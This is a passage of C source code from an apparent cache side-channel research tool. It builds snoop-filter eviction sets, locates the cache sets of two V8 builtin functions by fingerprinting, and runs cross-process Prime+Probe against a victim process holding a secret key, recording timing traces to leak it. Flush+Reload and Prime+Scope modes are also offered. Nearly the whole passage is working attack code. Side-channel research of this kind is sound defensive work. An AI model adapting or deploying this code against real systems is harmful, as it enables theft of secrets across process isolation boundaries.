 * pp_evsets / pp_chains for both lines. Returns 0 iff both were found. */
static int v8_ct_csi(config_t *cfg) {
	uint32_t target_page_slot[xproc_cache_line_count];
	for (int cl = 0; cl < xproc_cache_line_count; ++cl) {
		target_page_slot[cl] =
		    (uint32_t)((target_addr[cl] & (PAGE_SIZE - 1)) >> CL_SHIFT);
	}

	int found = 0;
	for (int l3_set = 0;
	     l3_set < (int)cfg->l3.sets && found < xproc_cache_line_count;
	     ++l3_set) {
		uint32_t page_slot = (uint32_t)(l3_set % NUM_PAGE_SLOTS);

		int relevant = 0;
		for (int cl = 0; cl < xproc_cache_line_count; ++cl) {
			if (!pp_evsets[cl] && page_slot == target_page_slot[cl]) {
				relevant = 1;
				break;
			}
		}
		if (!relevant) {
			continue;
		}

		EVSet *evset = get_sf_kth_evset(l3_set);
		if (!evset) {
			log_warn("CSI: no evset for l3_set=%d", l3_set);
			continue;
		}
		evchain *chain = evchain_build(evset->addrs, SF_ASSOC);

		int cnt[csi_probe_count];
		for (int ki = 0; ki < csi_probe_count; ++ki) {
			csi_set_key(cfg->project_root, ct_probe_keys[ki]);
			cnt[ki] = (int)csi_profile_once(evset, chain);
		}
		log_info("CSI l3_set=%d(%x) page_slot=%u cnt=(ones=%d,msb=%d,alt=%d)",
		         l3_set,
		         l3_set,
		         page_slot,
		         cnt[0],
		         cnt[1],
		         cnt[2]);

		int matched = 0;
		for (int cl = 0; cl < xproc_cache_line_count; ++cl) {
			if (pp_evsets[cl] || page_slot != target_page_slot[cl]) {
				continue;
			}
			if (csi_line_matches(cl, cnt[0], cnt[1], cnt[2])) {
				pp_evsets[cl] = evset;
				pp_chains[cl] = chain;
				++found;
				matched = 1;
				log_info(LOG_BOLD_ON
				         "CSI: found cl%d (%s) at l3_set=%d(%x)" LOG_BOLD_OFF,
				         cl,
				         cl == 0 ? "Negate/true" : "BitAnd/false",
				         l3_set,
				         l3_set);
			}
		}
		(void)matched;
	}

	if (found < xproc_cache_line_count) {
		log_error("CSI: only located %d/%d target sets",
		          found,
		          xproc_cache_line_count);
		return 1;
	}
	log_info("CSI: located all %d target sets", xproc_cache_line_count);
	return 0;
}

/* Tell the victim to EXIT (barrier A only -- the victim breaks before B). */
static void csi_tell_victim_exit(void) {
	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier); /* A: victim exits (no B) */
}

/* Attacker process: attach to the victim's sync_ctx, read the published builtin
 * bases, build all SF evsets, LOCATE the two target sets by CSI fingerprint,
 * then prime+probe both lines per sign of the real key. */
static int v8_ct_process_main(int argc, char *argv[]) {
	(void)argc;
	(void)argv;

	if (cache_env_init(1)) {
		log_error("attacker: failed to initialize cache env");
		return 1;
	}
	init_sync_ctx(V8_PROJ_ID);

	pthread_barrier_wait(sync_ctx.barrier); /* #1: victim published bases */

	/* v8_run_loop publishes {jit_machine_code, NegateHandler, BitwiseAndSmiWide};
	 * slots [1] and [2] are the two builtin bases we monitor. */
	uintptr_t *published = (uintptr_t *)sync_ctx.data;
	uintptr_t bases[xproc_cache_line_count] = { published[1], published[2] };
	for (int cl = 0; cl < xproc_cache_line_count; ++cl) {
		target_addr[cl] = bases[cl] + builtin_line_off[cl];
		log_info("attacker cl%d base=%p target=%p page_slot=%u",
		         cl,
		         (void *)bases[cl],
		         (void *)target_addr[cl],
		         (unsigned)((target_addr[cl] & (PAGE_SIZE - 1)) >> CL_SHIFT));
	}

	config_t *cfg = get_config();

	/* Build every SF eviction set once; the CSI scan then selects among them. */
	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("attacker: failed to start helper thread");
		return 1;
	}
	if (LLCF_multi_evset(0, &hctrl)) {
		log_error("attacker: failed to build SF evsets");
		stop_helper_thread(&hctrl);
		return 1;
	}
	stop_helper_thread(&hctrl);

	pthread_barrier_wait(sync_ctx.barrier); /* #2: attacker armed */

	/* Cache-set identification: drives the victim (SET_KEY + START) itself. */
	if (v8_ct_csi(cfg)) {
		csi_tell_victim_exit();
		return 1;
	}

	for (int cl = 0; cl < xproc_cache_line_count; ++cl) {
		pp_sample_tsc[cl] = pp_sample_tsc_arr[cl];
		pp_probe_time[cl] = pp_probe_time_arr[cl];
	}

	/* Attack phase: load the real key, then prime+probe both located lines. */
	csi_set_key(cfg->project_root, ct_attack_key);

	pthread_barrier_init(&pp_local_barrier, nullptr, xproc_cache_line_count);
	pthread_t slot1;
	if (pthread_create(&slot1, nullptr, pp_slot1_thread, nullptr) != 0) {
		log_error("attacker: failed to start slot1 thread");
		csi_tell_victim_exit();
		return 1;
	}

	helper_thread_ctrl slot0_hctrl;
	if (start_helper_thread(&slot0_hctrl)) {
		log_error("attacker: failed to start slot0 helper thread");
		csi_tell_victim_exit();
		pthread_join(slot1, nullptr);
		return 1;
	}

	for (int r = 0; r < xproc_victim_runs; ++r) {
		memset(pp_sample_tsc_arr, 0, sizeof(pp_sample_tsc_arr));
		memset(pp_probe_time_arr, 0, sizeof(pp_probe_time_arr));

		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier);  /* A: release victim */
		pthread_barrier_wait(&pp_local_barrier); /* A': arm both slots */

		uint32_t index = pp_profile_window(0);

		pthread_barrier_wait(&pp_local_barrier); /* B': window closed */
		pthread_barrier_wait(sync_ctx.barrier);  /* B: rendezvous victim */

		log_info("run %d/%d: slot0 %u samples", r + 1, xproc_victim_runs, index);
		dump_profiling_traces(test_name,
		                      xproc_victim_runs,
		                      pp_sample_tsc,
		                      pp_probe_time,
		                      xproc_cache_line_count,
		                      profile_iterations,
		                      r == 0);
	}

	csi_tell_victim_exit();

	stop_helper_thread(&slot0_hctrl);
	pthread_join(slot1, nullptr);
	return 0;
}

int main(int argc, char *argv[]) {
	int mode_attacker = 0, new_argc = 0;
	for (int i = 0; i < argc; ++i) {
		if (strcmp(argv[i], "-attacker") == 0 ||
		    strcmp(argv[i], "-x") == 0) {
			mode_attacker = 1;
		} else if (strcmp(argv[i], "-fr") == 0) {
			use_flush_reload = true;
		} else {
			argv[new_argc++] = argv[i];
		}
	}
	argc = new_argc;

	/* Cross-process CSI + prime+probe attacker takes no script arguments; the
	 * victim is the generic v8_rt (v8_run_loop) driven over sync_ctx. */
	if (mode_attacker) {
		return v8_ct_process_main(argc, argv);
	}

	if (argc < 3) {
		log_error("Usage: %s [-fr] <source.js> <repeat.js>   "
		          "(same-process PRIME+SCOPE, or FLUSH+RELOAD with -fr)",
		          argv[0]);
		log_error("       %s -attacker                 "
		          "(cross-process PRIME+PROBE attacker; victim = v8_rt)",
		          argv[0]);
		return 1;
	}

	return v8_ct_thread_main(argc, argv);
}
